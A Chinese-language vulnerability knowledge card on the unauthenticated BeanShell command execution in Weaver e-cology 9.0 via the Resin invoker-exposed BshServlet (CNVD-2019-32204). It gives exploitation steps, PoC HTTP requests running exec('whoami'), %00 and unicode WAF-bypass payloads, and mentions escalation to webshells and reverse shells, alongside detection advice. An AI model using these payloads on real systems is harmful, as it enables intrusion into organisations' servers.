---
id: web-java-component-weaver-ecology-bshservlet-invoker-rce
title: 泛微 e-cology 9.0 Resin InvokerServlet 暴露 BshServlet：/weaver/bsh.servlet.BshServlet 未授权 BeanShell 命令执行（CNVD-2019-32204）
type: scenario
domain: web
path: web/java/component
technique: weaver-ecology-resin-invoker-bshservlet-rce
aliases:
- 泛微 OA BshServlet RCE
- CNVD-2019-32204
- 泛微 e-cology BeanShell
- /weaver/bsh.servlet.BshServlet
- Resin invoker servlet
- 泛微 OA 未授权命令执行
tags:
- java
- weaver
- ecology
- oa
- resin
- invoker-servlet
- beanshell
- bsh
- rce
- cnvd-2019-32204
cve: []
severity: critical
confidence: high
status: verified
affected_versions: 泛微 e-cology 9.0（原文标题标注）
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V566
  verified_at: '2026-11-12T09:18:42+08:00'
  notes: 已对照原文 24 张图核对：图01 BeanShell Test Servlet 2.0b4 页面 exec(whoami) 回显 root 与 nt authority\system，图02 web-app 将 /weaver/* 映射 invoker，图03 WEB-INF/lib 下 bsh-2[1].0b4.jar，图04-06 doGet→evalScript→Interpreter.eval→exec.bsh。生效 PoC（页面提交 exec(whoami)、eval%00 拼接绕过）与原文一致；入库时丢失的 Unicode 绕过串已修正为原文的 ex\u0065c 形式（知识卡与草稿同步）。affected_versions 原文标题标注 9.0。dedup top 为 Tomcat InvokerServlet BshServlet 卡（cos 0.90）与用友 U8C BshServlet 卡，同 sink 但容器/产品/入口不同，库内已有按产品拆卡先例，非同链；dup-scan 无涉及 pair。未验证点：未复现。
---

## 一句话结论

泛微 e-cology 9.0 默认用 Resin 部署并在 `resin.xml` 中把 `/weaver/*` 映射给 `invoker` Servlet，类名路由使 classpath 里未映射的 `bsh.servlet.BshServlet` 可经 `/weaver/bsh.servlet.BshServlet/` 未授权访问；该 Servlet 直接对请求参数 `bsh.script` 调用 BeanShell `Interpreter.eval()`，执行 `exec("whoami")` 即以应用进程身份回显命令结果（CNVD-2019-32204），并可用 `eval%00` 与字符串拼接/Unicode 转义绕过 WAF。

## 原理

- **入口来自 Resin invoker 类名路由**：`Resin\conf\resin.xml` 中存在 `<servlet-mapping url-pattern='/weaver/*' servlet-name='invoker'/>`，Resin 的 invoker 会把 `/weaver/` 后的字符串当作类名在 `CLASSPATH` 中查找并调用对应 Servlet，无需 `web.xml` 显式映射。因此访问 `/weaver/bsh.servlet.BshServlet/` 即命中 `WEB-INF/lib/bsh-2[1].0b4.jar` 内的 `bsh.servlet.BshServlet`。
- **BshServlet 本身就是脚本执行器**：`BshServlet.doGet` 读取 `bsh.script`、`bsh.client`、`bsh.servlet.output`、`bsh.servlet.captureOutErr` 等参数，把 `bsh.script` 交给 `evalScript`；`evalScript` 创建 `bsh.Interpreter` 并调用 `Interpreter.eval(script)`，脚本在容器 JVM 内执行，`System.out/err` 被捕获后回显在 “Script Output” 区域。
- **为什么能执行系统命令**：BeanShell 默认脚本可访问 `java.lang.Runtime`，其内置 `exec.bsh` 脚本（`Runtime.getRuntime().exec(arg)` + 读取 `getInputStream()`）实现了 `exec(String)` 命令；因此 `exec("whoami")` 直接派生进程，身份即 Resin 服务账号（原文 Linux 回显 root、Windows 回显 `nt authority\system`）。
- **WAF 绕过原理**：`bsh.script=eval%00("ex"%2b"ec(\"whoami\")");` 用 `%00` 截断/干扰规则匹配、用 `"ex"+"ec"` 拼接还原 `exec`；`bsh.script=ex\u0065c("whoami")` 用 `\u0065` Unicode 转义（`\u0065` 即 `e`，解析后仍是 `exec`）绕过关键字匹配，二者最终都被 BeanShell 求值为 `exec(...)` 调用。
- **与已有通用卡的区别**：同一 BshServlet sink 曾在 Tomcat InvokerServlet（`/servlet/bsh.servlet.BshServlet`）与用友 U8C（`/servlet/~ic/...`）场景出现；本卡的容器是 Resin、入口是 `/weaver/*` 的 invoker 类名路由、产品为泛微 e-cology，并带 `%00`/Unicode 的 WAF 绕过 PoC，触发条件与利用报文均不同。

## 触发条件

- 目标为泛微 e-cology 9.0（或采用相同默认 Resin 配置的版本），Resin 的 invoker Servlet 开启且映射 `/weaver/*`。
- `WEB-INF/lib` 中存在 BeanShell（原文 `bsh-2[1].0b4.jar`，版本页面显示 BeanShell 2.0b4）。
- `/weaver/bsh.servlet.BshServlet/` 可从外网访问；WAF 未拦截或可用 `%00`/Unicode/字符串拼接绕过。
- 应用进程允许派生系统进程（命令回显依赖进程权限）。

## 利用步骤

1. 指纹确认：访问 `/weaver/bsh.servlet.BshServlet/`，若返回标题为 “BeanShell Test Servlet”、显示 “BeanShell version: 2.0b4” 的页面，说明 invoker 与 bsh jar 均可用。
2. 页面直接执行：在 Script 框提交 `exec("whoami")` 并点 Evaluate，在 “Script Output” 查看回显（原文回显 root / `nt authority\system`）。
3. 请求方式执行：发送 `bsh.script=exec("whoami")`；若被 WAF 拦截，改用 `bsh.script=eval%00("ex"%2b"ec(\"whoami\")");` 或 `bsh.script=ex\u0065c("whoami")`。
4. 扩大利用：执行任意命令读取配置/数据库口令、写入 JSP/内存马或反弹 Shell；BeanShell 也可直接调用 Java API（文件读写、类加载）完成后续操作。

## PoC

```http
GET /weaver/bsh.servlet.BshServlet/ HTTP/1.1
Host: target
```

```http
POST /weaver/bsh.servlet.BshServlet/ HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

bsh.script=exec("whoami")
```

WAF 绕过变体：

```text
bsh.script=eval%00("ex"%2b"ec(\"whoami\")");
bsh.script=ex\u0065c("whoami")
```

返回页面 “Script Output” 中出现命令结果即成功。原文未给出完整的 bsh.script POST 原始报文，页面提交与两条绕过串为原文实测内容。

## 变体与关联

- Resin invoker 类名路由本身是通用入口：`/weaver/<全限定类名>` 可调用 classpath 中任意带 Servlet 接口的类，BshServlet 只是其中最直接的一个；同类风险还包括其他调试/管理 Servlet。
- 同一 BshServlet sink 的历史卡：Tomcat InvokerServlet（`/servlet/bsh.servlet.BshServlet`）与用友 U8C（`/servlet/~ic/bsh.servlet.BshServlet`），入口容器与产品不同，可互相参照 payload。
- WAF 绕过可叠加：`%00`、Unicode 转义、字符串拼接、大小写与注释；BeanShell 也可用 `eval`/`exec` 别名与反射构造规避关键字。
- 后续利用可衔接本文章的 Resin 回显与 Filter 内存马（另卡），把命令执行升级为稳定回显通道与内存驻留。

## 检测与防御

- 升级泛微 e-cology 并修复 CNVD-2019-32204；删除不需要的 `bsh` 依赖，或禁用 Resin invoker（移除 `/weaver/*` 到 invoker 的映射）。
- 在 Resin/反向代理层拦截 `/weaver/bsh.servlet.BshServlet`、`bsh.script`、`bsh.client` 等特征；对 `%00`、`\u` 转义与拼接执行关键字做规范化后再检测。
- 应用服务以低权限账户运行，限制派生进程与写 Web 目录；部署 RASP 监控 `Interpreter.eval`、`Runtime.exec`、`ProcessBuilder.start`。
- 日志排查：请求 `/weaver/bsh.servlet.BshServlet` 的 200 响应、`bsh.script` 参数、页面出现 “BeanShell Test Servlet” 标题。
